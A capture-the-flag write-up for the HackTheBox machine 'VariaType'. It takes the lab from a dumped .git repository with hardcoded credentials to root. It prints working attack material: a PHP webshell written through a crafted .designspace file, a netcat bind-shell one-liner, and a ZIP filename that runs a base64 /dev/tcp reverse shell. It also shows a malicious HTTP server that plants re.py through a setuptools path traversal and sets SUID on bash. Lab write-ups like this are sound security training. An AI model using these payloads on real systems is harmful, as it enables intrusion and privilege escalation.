# HackTheBox — VariaType (Medium / Linux)

**Author:** thrandomv  
**Date:** March 18, 2026  
**Flags:**  
- User: `ac8af3ca90643e6373a9bb9f9262258c`  
- Root: `2e6fd921a2b057aca0b39fafbe9beff7`

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sC -sV -T4 -p- -Pn --min-rate 5000 10.129.88.21
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open  http    nginx/1.22.1
```

Two ports. SSH and a web server.

### Virtual Host Enumeration

Added base host to `/etc/hosts`:

```bash
echo "10.129.88.21 variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts
```

`portal.variatype.htb` discovered via subdomain fuzzing and page source references. Two distinct web apps:

| Host | Stack | Purpose |
|------|-------|---------|
| `variatype.htb` | Python / Flask | Public variable font generator |
| `portal.variatype.htb` | PHP 8.2 / nginx | Internal font validation dashboard |

---

## Foothold — Exposed Git Repository + CVE-2025-66034

### Git Dump

Directory enumeration on `portal.variatype.htb` revealed an accessible `.git/` directory.

```bash
git-dumper http://portal.variatype.htb/.git/ ./portal-repo/
cd portal-repo
git log --oneline
# 753b5f5 fix: add gitbot user for automated validation pipeline
# 5030e79 feat: initial portal implementation

git log -p
```

Diff exposed hardcoded credentials in `auth.php`:

```
'gitbot' => 'G1tB0t_Acc3ss_2025!'
```

### Webshell via Malicious .designspace (CVE-2025-66034)

The public font generator at `http://variatype.htb/tools/variable-font-generator` accepts `.designspace` XML files and processes them with fonttools. The `<labelname>` field is written verbatim into the output font filename — allowing arbitrary file write via the `filename` attribute in the `<variable-font>` element.

**Crafted exploit.designspace:**

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); ?>]]]]><![CDATA[>]]></labelname>
      <labelname xml:lang="fr">Regular</labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

**Generated minimal TTF masters using fontTools:**

```python
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def build_master(filename, weight_value, advance_width):
    fb = FontBuilder(1000, isTTF=True)
    fb.setupGlyphOrder(['.notdef', 'A'])
    fb.setupCharacterMap({65: 'A'})
    pen_notdef = TTGlyphPen(None)
    pen_A = TTGlyphPen(None)
    pen_A.moveTo((100, 0))
    pen_A.lineTo((advance_width - 100, 0))
    pen_A.lineTo((advance_width // 2, 700))
    pen_A.closePath()
    fb.setupGlyf({'.notdef': pen_notdef.glyph(), 'A': pen_A.glyph()})
    fb.setupHorizontalMetrics({'.notdef': (500, 0), 'A': (advance_width, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupNameTable({'familyName': 'Test', 'styleName': 'Regular'})
    fb.setupOS2(sTypoAscender=800, sTypoDescender=-200, usWeightClass=weight_value)
    fb.setupPost()
    fb.setupHead(unitsPerEm=1000)
    fb.font.save(filename)

build_master('source-light.ttf', weight_value=100, advance_width=300)
build_master('source-regular.ttf', weight_value=400, advance_width=500)
```

**Uploaded to the generator:**

```bash
curl -F 'designspace=@exploit.designspace' \
     -F 'masters=@source-light.ttf' \
     -F 'masters=@source-regular.ttf' \
     http://variatype.htb/tools/variable-font-generator/process
```

**Verified RCE:**

```bash
curl --output - "http://portal.variatype.htb/files/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell as www-data

Outbound connections were filtered on all ports except 80/443. Used a bind shell:

```bash
# Target
curl --output - "http://portal.variatype.htb/files/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20-lvnp%209001%20%3E%2Ftmp%2Ff%20%26"

# Attacker
nc 10.129.88.21 9001
```

---

## Lateral Movement — www-data → steve (CVE-2024-25081)

### Discovery

Found `/opt/process_client_submissions.bak` — a bash script owned by `steve` that runs as steve (via cron). It processes files from `/var/www/portal.variatype.htb/public/files/`, unpacking archives and passing filenames to FontForge for validation.

The script uses unquoted filename expansion inside a FontForge Python inline string — ZIP archive entries with shell metacharacters in their filenames execute as shell commands (CVE-2024-25081).

### Exploit

**Build malicious ZIP with command-injection filename:**

```python
import zipfile

payload = "<BASE64_OF: bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1>"
fname = f"$(echo {payload}|base64 -d|bash).ttf"
with zipfile.ZipFile('/tmp/exploit.zip', 'w') as z:
    z.writestr(fname, 'dummy')
```

**Deliver:**

```bash
# Serve on attacker
python3 -m http.server 8000

# Drop on target (as www-data)
curl http://ATTACKER_IP:8000/exploit.zip \
     -o /var/www/portal.variatype.htb/public/files/exploit.zip
```

**Listener on attacker:**

```bash
sudo nc -lvnp 443
```

Cron job fires, processes the ZIP, executes the embedded payload — shell received as `steve`.

```bash
cat ~/user.txt
# ac8af3ca90643e6373a9bb9f9262258c
```

---

## Privilege Escalation — steve → root

### sudo -l

```
User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

### Analysis of install_validator.py

The script uses `setuptools.package_index.PackageIndex().download()` to fetch a plugin from a user-supplied URL and save it to `/opt/font-tools/validators/`.

The `_download_url` function in setuptools 66.1.1 derives the destination filename from the URL path. The traversal protection uses:

```python
if not filename.startswith(str(tmpdir)):
    raise ValueError(...)
```

No trailing slash on `tmpdir` — bypassable. Using a URL-encoded leading slash (`%2f`) in the path produces an absolute path string that passes the `startswith` check but resolves outside the intended directory.

**Tested:**
```
URL: http://host/%2fopt%2ffont-tools%2fre.py#egg=x-1.0
→ filename = /opt/font-tools/validators/./re.py  (startswith passes)
→ written to: /opt/font-tools/re.py
```

Since `/opt/font-tools` is the working directory when the script runs, Python adds it to `sys.path[0]` — our planted `re.py` gets imported before the real stdlib `re`.

### Exploitation

**Malicious server:**

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        payload = b"import os\nos.system('chmod u+s /bin/bash')\n"
        self.send_response(200)
        self.send_header("Content-Type", "application/zip")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", 8001), Handler).serve_forever()
```

**Plant malicious re.py:**

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  "http://ATTACKER_IP:8001/%2fopt%2ffont-tools%2fre.py#egg=x-1.0"
```

**Trigger module import as root (any subsequent sudo run imports our re.py):**

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py "http://x" 2>/dev/null
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash
```

**Root:**

```bash
/bin/bash -p
cat /root/root.txt
# 2e6fd921a2b057aca0b39fafbe9beff7
```

---

## Attack Chain Summary

```
Nmap → 80/tcp nginx
  └─ Vhost enum → portal.variatype.htb
       └─ .git exposed → git-dumper → gitbot:G1tB0t_Acc3ss_2025!
            └─ CVE-2025-66034 → .designspace arbitrary write → PHP webshell
                 └─ Bind shell → www-data
                      └─ CVE-2024-25081 → ZIP filename injection → steve
                           └─ sudo install_validator.py → setuptools %2f traversal
                                └─ Python sys.path hijack (re.py) → chmod u+s bash → root
```
